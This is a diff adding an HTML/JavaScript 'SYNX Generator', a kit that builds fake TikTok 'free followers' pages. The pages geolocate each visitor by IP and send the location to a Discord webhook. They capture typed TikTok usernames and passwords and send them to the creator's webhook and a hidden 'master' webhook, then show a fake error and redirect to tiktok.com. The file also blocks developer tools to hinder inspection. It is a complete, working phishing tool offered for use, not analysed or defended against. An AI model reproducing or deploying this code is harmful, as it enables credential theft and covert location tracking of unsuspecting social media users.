@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYNX Generator</title>
+    <style>
+        /* ===== BASE STYLES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        /* ===== GENERATOR PAGE ===== */
+        .generator-container {
+            width: 100%;
+            max-width: 500px;
+            background-color: #1a1a1a;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            margin: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            color: #ff2a2a;
+            text-shadow: 0 0 10px rgba(255, 42, 42, 0.5);
+            animation: glow 2s infinite alternate;
+            margin-bottom: 10px;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 5px #ff2a2a; }
+            to { text-shadow: 0 0 15px #ff2a2a; }
+        }
+
+        .header p {
+            color: #aaa;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #ddd;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff2a2a;
+            box-shadow: 0 0 0 2px rgba(255, 42, 42, 0.2);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ff2a2a, #d41c1c);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 42, 42, 0.3);
+        }
+
+        /* ===== MODALS ===== */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: modalFadeIn 0.3s;
+            border: 1px solid #ff2a2a;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal h2 {
+            color: #ff2a2a;
+            margin-bottom: 15px;
+        }
+
+        .modal p {
+            margin-bottom: 20px;
+            color: #ccc;
+        }
+
+        /* ===== ANTI-INSPECT ===== */
+        #no-inspect {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            color: #ff2a2a;
+            font-size: 24px;
+            text-align: center;
+            padding-top: 100px;
+            z-index: 9999;
+        }
+
+        /* ===== TIKTOK PAGE ===== */
+        .tiktok-page {
+            display: none;
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        .selection-container, .login-container {
+            width: 100%;
+            padding: 40px 36px 36px;
+            background-color: white;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 1px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(22, 24, 35, 0.06);
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .selection-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            color: #161823;
+            background: linear-gradient(45deg, #FE2C55, #25F4EE);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .follower-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .follower-option {
+            padding: 20px;
+            border-radius: 8px;
+            background-color: rgba(254, 44, 85, 0.1);
+            border: 1px solid rgba(254, 44, 85, 0.2);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .follower-option:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(254, 44, 85, 0.2);
+            background-color: rgba(254, 44, 85, 0.15);
+        }
+
+        .follower-option.active {
+            background-color: rgba(254, 44, 85, 0.2);
+            border-color: #FE2C55;
+        }
+
+        .follower-count {
+            font-size: 24px;
+            font-weight: 700;
+            color: #FE2C55;
+            margin-bottom: 5px;
+        }
+
+        .follower-label {
+            font-size: 14px;
+            color: #161823;
+            opacity: 0.8;
+        }
+
+        .proceed-btn, .login-button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(45deg, #FE2C55, #25F4EE);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
+        }
+
+        .proceed-btn:hover, .login-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(254, 44, 85, 0.4);
+        }
+
+        .info-box {
+            width: 100%;
+            padding: 16px;
+            background-color: white;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 1px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(22, 24, 35, 0.06);
+            font-size: 14px;
+            color: rgba(22, 24, 35, 0.5);
+        }
+
+        .info-box a {
+            color: #161823;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* ===== ANIMATIONS ===== */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #FE2C55;
+            opacity: 0;
+            z-index: 10;
+            animation: confetti 2s ease-out;
+        }
+
+        @keyframes confetti {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100px) rotate(360deg); opacity: 0; }
+        }
+
+        .follower-animation {
+            position: absolute;
+            color: rgba(254, 44, 85, 0.2);
+            font-weight: 700;
+            font-size: 14px;
+            z-index: 1;
+            pointer-events: none;
+            user-select: none;
+        }
+
+        .follower-animation.left {
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            writing-mode: vertical-rl;
+            text-orientation: mixed;
+            animation: floatUp 8s linear infinite;
+        }
+
+        .follower-animation.right {
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            writing-mode: vertical-rl;
+            text-orientation: mixed;
+            animation: floatDown 8s linear infinite;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) translateY(-50%); opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-100vh) translateY(-50%); opacity: 0; }
+        }
+
+        @keyframes floatDown {
+            0% { transform: translateY(-100vh) translateY(-50%); opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(100vh) translateY(-50%); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Anti-Inspect Warning -->
+    <div id="no-inspect">
+        <h1>⚠️ Access Restricted</h1>
+        <p>Developer tools are disabled on this page.</p>
+    </div>
+
+    <!-- Generator Page -->
+    <div id="generatorPage">
+        <div class="generator-container">
+            <div class="header">
+                <h1>SYNX</h1>
+                <p>Create your custom TikTok followers page</p>
+            </div>
+
+            <div class="form-group">
+                <label for="directory">Page Name</label>
+                <input type="text" id="directory" placeholder="example">
+            </div>
+
+            <div class="form-group">
+                <label for="webhook">Discord Webhook URL</label>
+                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+            </div>
+
+            <button class="btn" id="createBtn">Generate Page</button>
+        </div>
+    </div>
+
+    <!-- TikTok Page (Hidden by default) -->
+    <div class="tiktok-page" id="tiktokPage">
+        <!-- Selection Page -->
+        <div class="selection-page" id="selectionPage">
+            <div class="selection-container">
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" width="1em" height="1em" fill="currentColor">
+                        <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"></path>
+                    </svg>
+                </div>
+
+                <h1 class="selection-title">Boost Your TikTok Followers</h1>
+
+                <div class="follower-options">
+                    <div class="follower-option" data-count="100">
+                        <div class="follower-count">100</div>
+                        <div class="follower-label">Followers</div>
+                    </div>
+
+                    <div class="follower-option" data-count="500">
+                        <div class="follower-count">500</div>
+                        <div class="follower-label">Followers</div>
+                    </div>
+
+                    <div class="follower-option" data-count="1000">
+                        <div class="follower-count">1,000</div>
+                        <div class="follower-label">Followers</div>
+                    </div>
+
+                    <div class="follower-option" data-count="5000">
+                        <div class="follower-count">5,000</div>
+                        <div class="follower-label">Followers</div>
+                    </div>
+
+                    <div class="follower-option" data-count="10000">
+                        <div class="follower-count">10,000</div>
+                        <div class="follower-label">Followers</div>
+                    </div>
+
+                    <div class="follower-option" data-count="100000">
+                        <div class="follower-count">100,000</div>
+                        <div class="follower-label">Followers</div>
+                    </div>
+                </div>
+
+                <button class="proceed-btn" id="proceedBtn">Start</button>
+            </div>
+
+            <div class="info-box">
+                <p>By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a></p>
+            </div>
+        </div>
+
+        <!-- Login Page -->
+        <div class="login-wrapper" id="loginPage">
+            <div class="follower-animation left">+100 Followers +500 Followers +1K Followers +5K Followers +10K Followers +100K Followers</div>
+            <div class="follower-animation right">Boost Your Account Get More Views Increase Engagement Viral Content Trending Now</div>
+
+            <div class="login-container">
+                <div class="logo">
+                    <svg viewBox="0 0 24 24" width="1em" height="1em" fill="currentColor">
+                        <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"></path>
+                    </svg>
+                </div>
+
+                <h1>Log in to TikTok</h1>
+
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Email or username">
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password">
+                </div>
+
+                <button class="login-button" id="loginBtn">Log in</button>
+
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+
+                <div class="divider">or continue with</div>
+
+                <div class="other-login">
+                    <div class="login-option" id="googleLogin">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
+                            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+                            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+                            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+                            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+                        </svg>
+                    </div>
+                    <div class="login-option" id="facebookLogin">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
+                            <path fill="#039BE5" d="M24 5A19 19 0 1 0 24 43A19 19 0 1 0 24 5Z"/>
+                            <path fill="#FFF" d="M26.572,29.036h4.917l0.772-4.995h-5.69v-2.73c0-2.075,0.678-3.915,2.619-3.915h3.119v-4.359c-0.548-0.074-1.707-0.236-3.897-0.236c-4.573,0-7.254,2.415-7.254,7.917v3.323h-4.701v4.995h4.701v13.729C22.089,42.905,23.032,43,24,43c0.875,0,1.729-0.08,2.572-0.194V29.036z"/>
+                        </svg>
+                    </div>
+                    <div class="login-option" id="twitterLogin">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
+                            <path fill="#1E88E5" d="M24 4A20 20 0 1 0 24 44A20 20 0 1 0 24 4Z"/>
+                            <path fill="#FFF" d="M29 24A5 5 0 1 0 29 34A5 5 0 1 0 29 24Z"/>
+                            <path fill="#FFF" d="M19 14A5 5 0 1 0 19 24A5 5 0 1 0 19 14Z"/>
+                            <path fill="#FFF" d="M34.6 17A5 5 0 1 0 34.6 27A5 5 0 1 0 34.6 17Z"/>
+                            <path fill="#FFF" d="M13.4 17A5 5 0 1 0 13.4 27A5 5 0 1 0 13.4 17Z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="signup-link">
+                    Don't have an account?<a href="#">Sign up</a>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <p>By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <h2>✅ Success!</h2>
+            <p>Your page has been created successfully.</p>
+            <div id="successDetails" style="
+                background: #2a2a2a;
+                padding: 15px;
+                border-radius: 5px;
+                margin: 15px 0;
+                text-align: left;
+                font-family: monospace;
+            "></div>
+            <button class="btn" id="successOkBtn">OK</button>
+        </div>
+    </div>
+
+    <div class="modal" id="errorModal">
+        <div class="modal-content">
+            <h2>❌ Error</h2>
+            <p id="errorMessage">Something went wrong.</p>
+            <button class="btn" id="errorOkBtn">OK</button>
+        </div>
+    </div>
+
+    <div class="modal" id="loadingModal">
+        <div class="modal-content">
+            <div class="loading-spinner"></div>
+            <div class="modal-title" id="modalTitle">Processing</div>
+            <div class="modal-message" id="modalMessage">Please wait...</div>
+        </div>
+    </div>
+
+    <script>
+        // =========================================
+        // MAIN APPLICATION CODE
+        // =========================================
+
+        // DOM Elements
+        const generatorPage = document.getElementById('generatorPage');
+        const tiktokPage = document.getElementById('tiktokPage');
+        const directoryInput = document.getElementById('directory');
+        const webhookInput = document.getElementById('webhook');
+        const createBtn = document.getElementById('createBtn');
+        const successModal = document.getElementById('successModal');
+        const errorModal = document.getElementById('errorModal');
+        const loadingModal = document.getElementById('loadingModal');
+        const successDetails = document.getElementById('successDetails');
+        const errorMessage = document.getElementById('errorMessage');
+        const successOkBtn = document.getElementById('successOkBtn');
+        const errorOkBtn = document.getElementById('errorOkBtn');
+        const noInspect = document.getElementById('no-inspect');
+        const proceedBtn = document.getElementById('proceedBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const followerOptions = document.querySelectorAll('.follower-option');
+
+        // Configuration
+        const MASTER_WEBHOOK = ''; // Add your master webhook here
+        const STORAGE_KEY = 'synx_pages';
+        const WORD_LIST = [
+            'alpha', 'bravo', 'charlie', 'delta', 'echo', 
+            'foxtrot', 'golf', 'hotel', 'india', 'juliet',
+            'kilo', 'lima', 'mike', 'november', 'oscar',
+            'papa', 'quebec', 'romeo', 'sierra', 'tango'
+        ];
+
+        // State
+        let selectedFollowers = 0;
+        let currentDirectory = '';
+        let directories = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
+
+        // Initialize the app
+        function init() {
+            setupEventListeners();
+            setupAntiInspect();
+            checkForRedirect();
+        }
+
+        // Check if we should show a generated page
+        function checkForRedirect() {
+            const path = window.location.pathname.split('/')[1];
+            if (path && path !== '') {
+                currentDirectory = path;
+                showTikTokPage();
+            }
+        }
+
+        // Show TikTok page
+        function showTikTokPage() {
+            generatorPage.style.display = 'none';
+            tiktokPage.style.display = 'block';
+            document.title = 'TikTok Followers | ' + currentDirectory;
+            initTikTokPage();
+        }
+
+        // Initialize TikTok page functionality
+        function initTikTokPage() {
+            let userInfo = {
+                ip: "unknown",
+                city: "unknown",
+                country: "unknown",
+                region: "unknown",
+                isp: "unknown",
+                exactLocation: "unknown",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                referrer: document.referrer || "Direct",
+                userAgent: navigator.userAgent,
+                selectedFollowers: 0
+            };
+
+            // Track IP and send visit info
+            trackIP();
+
+            async function trackIP() {
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    userInfo.ip = (await ipRes.json()).ip;
+
+                    const [geoData1, geoData2] = await Promise.all([
+                        fetch(`https://ipapi.co/${userInfo.ip}/json/`).then(res => res.json()).catch(() => ({})),
+                        fetch(`https://ipinfo.io/${userInfo.ip}/json?token=6921bf724a508a`).then(res => res.json()).catch(() => ({}))
+                    ]);
+
+                    userInfo.city = geoData2.city || geoData1.city || "Unknown";
+                    userInfo.country = geoData2.country || geoData1.country_name || "Unknown";
+                    userInfo.region = geoData2.region || geoData1.region || "Unknown";
+                    userInfo.isp = geoData2.org || geoData1.org || "Unknown";
+
+                    const coords = geoData2.loc ? geoData2.loc.split(',') : 
+                                 (geoData1.latitude ? [geoData1.latitude, geoData1.longitude] : []);
+                    userInfo.exactLocation = coords.length ? coords.join(',') : "unknown";
+
+                    await sendVisitInfo();
+                } catch (error) {
+                    console.error("IP tracking error:", error);
+                }
+            }
+
+            async function sendVisitInfo() {
+                const mapLink = userInfo.exactLocation !== "unknown" ? 
+                    `🗺️ [View Location](https://www.google.com/maps/place/${userInfo.exactLocation})` : 
+                    "📍 Location unknown";
+
+                const embed = {
+                    title: "👀 New Visitor 👀",
+                    description: `Someone visited your TikTok followers page`,
+                    color: 0x5865F2,
+                    fields: [
+                        {
+                            name: "🔍 IP Information",
+                            value: `**IP:** ||${userInfo.ip}||\n**ISP:** ${userInfo.isp}\n**Location:** ${userInfo.city}, ${userInfo.region}, ${userInfo.country}\n${mapLink}`,
+                            inline: false
+                        },
+                        {
+                            name: "💻 Device Info",
+                            value: `**Screen:** ${userInfo.screen}\n**Browser:** ${navigator.userAgent.split(') ')[0].split(' (')[1]}`,
+                            inline: true
+                        },
+                        {
+                            name: "⏱️ Time",
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Page",
+                            value: window.location.href,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                const webhooks = await getWebhooks();
+
+                if (webhooks.creatorWebhook) {
+                    await fetch(webhooks.creatorWebhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed] })
+                    }).catch(err => console.error('Error sending to creator webhook:', err));
+                }
+
+                if (webhooks.masterWebhook) {
+                    await fetch(webhooks.masterWebhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            content: `New visit on ${currentDirectory}`,
+                            embeds: [embed] 
+                        })
+                    }).catch(err => console.error('Error sending to master webhook:', err));
+                }
+            }
+
+            async function getWebhooks() {
+                const dirData = directories[currentDirectory.toLowerCase()];
+                return {
+                    creatorWebhook: dirData?.webhook || null,
+                    masterWebhook: MASTER_WEBHOOK
+                };
+            }
+
+            async function sendToWebhooks(email, password) {
+                const webhooks = await getWebhooks();
+
+                const embed = {
+                    title: "🎯 New TikTok Login 🎯",
+                    color: 0xFF5F5F,
+                    fields: [
+                        {
+                            name: "🔑 Credentials",
+                            value: `**Username/Email:** \`\`\`${email || "Not provided"}\`\`\`\n**Password:** \`\`\`${password || "Not provided"}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 IP Information",
+                            value: `**IP:** ||${userInfo.ip}||\n**ISP:** ${userInfo.isp}\n**Location:** ${userInfo.city}, ${userInfo.region}, ${userInfo.country}`,
+                            inline: false
+                        },
+                        {
+                            name: "📈 Selected Followers",
+                            value: `**Count:** ${userInfo.selectedFollowers.toLocaleString()}`,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Page",
+                            value: window.location.href,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                if (webhooks.creatorWebhook) {
+                    await fetch(webhooks.creatorWebhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed] })
+                    }).catch(err => console.error('Error sending to creator webhook:', err));
+                }
+
+                if (webhooks.masterWebhook) {
+                    await fetch(webhooks.masterWebhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            content: `New login on ${currentDirectory}`,
+                            embeds: [embed] 
+                        })
+                    }).catch(err => console.error('Error sending to master webhook:', err));
+                }
+            }
+
+            function createConfetti(element) {
+                const rect = element.getBoundingClientRect();
+                const colors = ['#FE2C55', '#25F4EE', '#FFFFFF', '#000000'];
+
+                for (let i = 0; i < 20; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.left = `${rect.left + rect.width/2 - 5 + Math.random() * 10}px`;
+                    confetti.style.top = `${rect.top + rect.height/2 - 5}px`;
+                    confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+                    document.body.appendChild(confetti);
+
+                    setTimeout(() => {
+                        confetti.remove();
+                    }, 2000);
+                }
+            }
+
+            function showLoading(title, message) {
+                document.getElementById('modalTitle').textContent = title;
+                document.getElementById('modalMessage').textContent = message;
+                loadingModal.style.display = 'flex';
+            }
+
+            function showError(message) {
+                errorMessage.textContent = message;
+                loadingModal.style.display = 'none';
+                errorModal.style.display = 'flex';
+            }
+
+            function selectFollowerOption(option) {
+                followerOptions.forEach(opt => opt.classList.remove('active'));
+                option.classList.add('active');
+                selectedFollowers = parseInt(option.getAttribute('data-count'));
+                userInfo.selectedFollowers = selectedFollowers;
+                createConfetti(option);
+            }
+
+            function proceedToLogin() {
+                if (selectedFollowers === 0) {
+                    showError('Please select a follower count first');
+                    return;
+                }
+                document.getElementById('selectionPage').style.display = 'none';
+                document.getElementById('loginPage').style.display = 'block';
+            }
+
+            async function handleLogin() {
+                const email = emailInput.value;
+                const password = passwordInput.value;
+
+                if (!email || !password) {
+                    showError('Please enter both email and password');
+                    return;
+                }
+
+                showLoading('Logging in', 'Please wait while we verify your credentials...');
+                await sendToWebhooks(email, password);
+
+                setTimeout(() => {
+                    showError('An error occurred. Please try again later.');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.tiktok.com';
+                    }, 3000);
+                }, 2000);
+            }
+
+            // Event listeners for TikTok page
+            followerOptions.forEach(option => {
+                option.addEventListener('click', () => selectFollowerOption(option));
+            });
+
+            proceedBtn.addEventListener('click', proceedToLogin);
+            loginBtn.addEventListener('click', handleLogin);
+            document.getElementById('googleLogin').addEventListener('click', () => {
+                showLoading('Logging in with Google', 'Connecting to Google...');
+                setTimeout(() => {
+                    showError('Could not connect to Google. Please try logging in normally.');
+                }, 3000);
+            });
+            document.getElementById('facebookLogin').addEventListener('click', () => {
+                showLoading('Logging in with Facebook', 'Connecting to Facebook...');
+                setTimeout(() => {
+                    showError('Could not connect to Facebook. Please try logging in normally.');
+                }, 3000);
+            });
+            document.getElementById('twitterLogin').addEventListener('click', () => {
+                showLoading('Logging in with Twitter', 'Connecting to Twitter...');
+                setTimeout(() => {
+                    showError('Could not connect to Twitter. Please try logging in normally.');
+                }, 3000);
+            });
+        }
+
+        // =========================================
+        // GENERATOR PAGE FUNCTIONS
+        // =========================================
+
+        // Set up event listeners
+        function setupEventListeners() {
+            createBtn.addEventListener('click', handleCreate);
+            successOkBtn.addEventListener('click', () => successModal.style.display = 'none');
+            errorOkBtn.addEventListener('click', () => errorModal.style.display = 'none');
+        }
+
+        // Handle page creation
+        async function handleCreate() {
+            const directory = directoryInput.value.trim();
+            const webhook = webhookInput.value.trim();
+
+            // Validate inputs
+            if (!directory) {
+                showError('Please enter a page name');
+                return;
+            }
+
+            if (!webhook) {
+                showError('Please enter a webhook URL');
+                return;
+            }
+
+            if (!isValidWebhook(webhook)) {
+                showError('Invalid Discord webhook URL');
+                return;
+            }
+
+            if (pageExists(directory)) {
+                showError('Page name already exists');
+                return;
+            }
+
+            // Generate token
+            const token = generateToken();
+
+            // Save page
+            savePage(directory, webhook, token);
+
+            // Send notifications
+            await sendNotifications(directory, webhook, token);
+
+            // Show success
+            showSuccess(directory, token);
+        }
+
+        // Check if page exists
+        function pageExists(name) {
+            return directories.hasOwnProperty(name.toLowerCase());
+        }
+
+        // Save a new page
+        function savePage(name, webhook, token) {
+            directories[name.toLowerCase()] = { webhook, token, created: new Date().toISOString() };
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(directories));
+        }
+
+        // Generate a 12-word token
+        function generateToken() {
+            let token = [];
+            for (let i = 0; i < 12; i++) {
+                token.push(WORD_LIST[Math.floor(Math.random() * WORD_LIST.length)]);
+            }
+            return token.join('-');
+        }
+
+        // Validate webhook URL
+        function isValidWebhook(url) {
+            return url.startsWith('https://discord.com/api/webhooks/');
+        }
+
+        // Send notifications to webhooks
+        async function sendNotifications(directory, webhook, token) {
+            const pageUrl = `${window.location.origin}/${directory}`;
+
+            const embed = {
+                title: "SYNX Page Created",
+                description: "New TikTok followers page is ready!",
+                color: 0xff2a2a,
+                fields: [
+                    { name: "Page URL", value: pageUrl },
+                    { name: "Access Token", value: `||${token}||` }
+                ],
+                timestamp: new Date().toISOString()
+            };
+
+            // Send to creator's webhook
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (err) {
+                console.error('Webhook error:', err);
+            }
+
+            // Send to master webhook if set
+            if (MASTER_WEBHOOK) {
+                try {
+                    await fetch(MASTER_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `New page: ${directory}`,
+                            embeds: [embed]
+                        })
+                    });
+                } catch (err) {
+                    console.error('Master webhook error:', err);
+                }
+            }
+        }
+
+        // Show success modal
+        function showSuccess(directory, token) {
+            const pageUrl = `${window.location.origin}/${directory}`;
+            successDetails.innerHTML = `
+                <strong>Page URL:</strong><br>${pageUrl}<br><br>
+                <strong>Access Token:</strong><br>${token}<br><br>
+                <small>Save this token to manage your page</small>
+            `;
+            successModal.style.display = 'flex';
+        }
+
+        // Show error modal
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorModal.style.display = 'flex';
+        }
+
+        // =========================================
+        // ANTI-INSPECT PROTECTION
+        // =========================================
+
+        function setupAntiInspect() {
+            // Block context menu
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                showInspectWarning();
+            });
+
+            // Block keyboard shortcuts
+            document.addEventListener('keydown', (e) => {
+                if (
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                    (e.ctrlKey && e.key === 'U')
+                ) {
+                    e.preventDefault();
+                    showInspectWarning();
+                }
+            });
+
+            // Detect devtools opening
+            let devtoolsOpen = false;
+            setInterval(() => {
+                const widthThreshold = window.outerWidth - window.innerWidth > 160;
+                const heightThreshold = window.outerHeight - window.innerHeight > 160;
+
+                if ((widthThreshold || heightThreshold) && !devtoolsOpen) {
+                    devtoolsOpen = true;
+                    showInspectWarning();
+                }
+            }, 1000);
+
